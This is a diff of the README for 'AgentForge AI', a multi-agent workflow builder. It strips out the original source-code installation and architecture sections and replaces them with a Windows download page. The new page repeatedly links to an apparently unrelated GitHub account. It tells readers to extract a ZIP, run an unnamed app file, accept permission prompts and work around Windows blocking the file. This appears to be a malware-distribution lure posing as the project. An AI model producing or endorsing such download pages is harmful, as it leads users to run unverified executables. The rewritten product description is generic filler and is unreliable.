@@ -1,84 +1,171 @@
-# AgentForge AI: Multi-Agent Orchestration Platform
+# 🤖 AgentForge-AI - Build and Run Multi-Agent Workflows
 
-![Python](https://img.shields.io/badge/python-3.10+-blue.svg)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.100+-05998b.svg?logo=fastapi&logoColor=white)
-![React](https://img.shields.io/badge/React-19-61dafb.svg?logo=react&logoColor=white)
-![Vite](https://img.shields.io/badge/Vite-6-646cff.svg?logo=vite&logoColor=white)
-![License](https://img.shields.io/badge/license-MIT-green.svg)
+[![Download AgentForge-AI](https://img.shields.io/badge/Download%20AgentForge--AI-blue?style=for-the-badge)](https://github.com/Milissenttending818/AgentForge-AI)
 
-AgentForge AI is a low-code, visual workflow builder designed for the orchestration of multi-agent systems. It provides a drag-and-drop interface for architecting autonomous agent teams, managing task assignments, and integrating specialized tools through a stateful execution engine.
+## 📥 Download AgentForge-AI
 
----
+Use the link below to visit the download page and get the app for Windows:
 
-## Interface Preview
+**[Download AgentForge-AI](https://github.com/Milissenttending818/AgentForge-AI)**
 
-| Visual Canvas Designer | Execution History and Logs |
-| :---: | :---: |
-| ![Canvas Designer](./assets/interface.png) | ![Workflow Designer](./assets/workflow.png) |
+## 🪟 Windows Setup
 
----
+AgentForge-AI is a Windows app for building and running multi-agent workflows. It gives you a visual way to set up tasks, connect steps, and watch activity in real time.
 
-## Core Objectives
+### What you need
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 1 GB of free disk space
+- Mouse and keyboard for setup
 
-AgentForge AI facilitates the creation of complex, non-linear agentic workflows. Unlike traditional linear automation tools, this platform supports:
+### Before you start
+- Close apps you do not need
+- Make sure you are signed in as a user who can install software
+- Keep the download page open so you can return to it if needed
 
-*   **Event-Driven Triggers:** Activation via Webhooks or Cron-based scheduling.
-*   **Autonomous Clusters:** Self-correcting agent teams capable of iterative reasoning.
-*   **Conditional Logic:** Dynamic branching based on agent output and confidence scores.
-*   **Human-in-the-Loop:** Manual intervention points for validation and approval.
+## 🚀 How to Install
 
-## Technical Architecture
+1. Open the download link above.
+2. Save the file to your computer.
+3. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+4. Open the extracted folder.
+5. Look for the app file and double-click it to start.
+6. If Windows asks for permission, select **Yes**.
+7. Wait for the app to load, then continue to the next section.
 
-*   **Frontend Infrastructure:** Developed with React and React Flow for high-performance graph rendering and state management.
-*   **Orchestration Backend:** Powered by FastAPI and CrewAI, utilizing a sequential and hierarchical processing model.
-*   **Inference Engine:** High-speed LLM execution via the Groq API (Llama-3.1-8b-instant).
-*   **Persistence Layer:** SQLAlchemy with SQLite for workflow blueprints and execution history.
-*   **Vector Infrastructure:** FAISS with HuggingFace embeddings for Document RAG (Retrieval-Augmented Generation).
+## 🖥️ First Launch
 
----
+When AgentForge-AI opens, you will see a visual workspace.
 
-## Installation and Deployment
+### What you can do first
+- Create a new workflow
+- Add task blocks to the canvas
+- Connect blocks to set the order of work
+- Run the workflow and watch the log view
+- Stop and edit the flow at any time
 
-### 1. Prerequisites
-*   Python 3.10 or higher
-*   Node.js 18 or higher
-*   Groq API Credentials
+### If the app does not open
+- Check that the download finished
+- Try running the app again
+- Restart your PC and try once more
+- Download the file again from the link above
 
-### 2. Backend Configuration
-Navigate to the backend directory to initialize the Python environment:
+## 🔧 How AgentForge-AI Works
 
-```bash
-cd backend
-python -m venv venv
-# Windows
-venv\Scripts\activate
-# Unix/macOS
-source venv/bin/activate
+AgentForge-AI helps you build a chain of tasks for AI agents. You can use it to plan work, assign steps, and see what each agent is doing.
 
-pip install -r requirements.txt
-cp .env.example .env
-uvicorn main:app --reload
-```
+### Core parts
+- **Visual builder** — drag and connect blocks on screen
+- **Stateful execution** — keep track of progress as the workflow runs
+- **Real-time logging** — see each step as it happens
+- **Multi-agent orchestration** — coordinate more than one AI agent
+- **Low-code setup** — use less manual setup and more point-and-click actions
 
-### 3. Frontend Configuration
-Navigate to the frontend directory to initialize the React application:
+## 📌 Common Uses
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+You can use AgentForge-AI for tasks like:
+- Research workflows
+- Support automation
+- Content planning
+- Data review steps
+- Multi-step AI task chains
+- Team-style agent coordination
 
----
+## 🧭 Basic Workflow
 
-## Development Roadmap
+1. Open the app.
+2. Create a new project.
+3. Add your first agent block.
+4. Add action steps after it.
+5. Connect the blocks in the order you want.
+6. Set task details in each block.
+7. Start the workflow.
+8. Watch the live log panel as the system runs.
+9. Edit any step and run it again.
 
-*   **Phase 2 Logic:** Implementation of dedicated Condition nodes for Boolean branching.
-*   **Validation Nodes:** Human-in-the-loop approval gates for critical production workflows.
-*   **Advanced Analytics:** Graphical execution browser for auditing agent logs and performance metrics.
-*   **Shared Memory:** Vector-based persistence allowing agents to maintain context across disparate sessions.
+## 🧩 Main Features
 
----
+### 🪄 Visual workflow editor
+Build flows by placing blocks on a canvas and linking them together.
 
-## License
-Distributed under the MIT License.
+### 📡 Real-time log view
+Watch each action as it runs so you can track progress.
+
+### 🔁 Stateful runs
+Keep workflow data between steps so agents can work with context.
+
+### 🤝 Multi-agent control
+Set up more than one agent and guide how they work together.
+
+### ⚙️ Flexible orchestration
+Arrange tasks in the order that fits your process.
+
+### 🧠 AI-ready design
+Use the app with common AI tools and agent patterns.
+
+## 📂 Suggested Folder Use
+
+If you want to keep things neat, use a folder like this:
+- `Downloads\AgentForge-AI`
+- `Documents\AgentForge-AI Projects`
+- `Desktop\AgentForge-AI Shortcuts`
+
+## 🛠️ Troubleshooting
+
+### The file will not open
+- Make sure you extracted the ZIP folder first
+- Check that Windows did not block the file
+- Right-click the file and choose **Open**
+
+### The app closes right away
+- Restart your computer
+- Open the app again
+- Try downloading the file again from the main link
+
+### The screen looks blank
+- Wait a few seconds for the app to load
+- Close and reopen the app
+- Check that your system meets the basic Windows needs above
+
+### The workflow does not run
+- Check that all blocks are connected
+- Make sure each step has the needed setup
+- Remove unused blocks and try again
+
+## 🔐 Safe Use Tips
+
+- Download only from the link on this page
+- Keep your Windows system updated
+- Do not move files while the app is open
+- Save your work often if the app offers a save option
+
+## 📄 Project Info
+
+**Name:** AgentForge-AI  
+**Type:** Low-code visual workflow builder  
+**Use case:** Orchestrating autonomous multi-agent systems  
+**Focus:** Stateful execution and real-time logging
+
+## 🧪 Example Setup
+
+A simple workflow might look like this:
+1. Research agent collects facts
+2. Planner agent sorts the facts
+3. Writer agent drafts the output
+4. Reviewer agent checks the result
+5. Logger tracks each step in real time
+
+## 📦 Download Again
+
+If you need the file again, use this link:
+
+**[Download AgentForge-AI](https://github.com/Milissenttending818/AgentForge-AI)**
+
+## 🧭 What to Do Next
+
+- Open the app
+- Create a workflow
+- Add agents
+- Connect steps
+- Run the flow and watch the logs
